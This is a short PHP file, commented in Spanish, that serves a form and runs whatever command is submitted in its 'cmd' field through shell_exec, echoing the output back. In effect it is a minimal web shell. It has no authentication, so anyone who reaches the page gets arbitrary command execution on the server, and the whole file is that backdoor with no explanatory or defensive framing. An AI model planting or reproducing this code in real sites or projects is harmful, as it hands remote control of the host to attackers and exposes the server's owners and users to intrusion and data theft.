<?php
// Mostrar el formulario y el resultado en la misma página
echo '<form method="POST">
    <input type="text" name="cmd" placeholder="Comando" style="width:300px;">
    <button type="submit">Ejecutar</button>
</form>';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    echo "<pre>" . htmlspecialchars(shell_exec($cmd)) . "</pre>";
}
?>
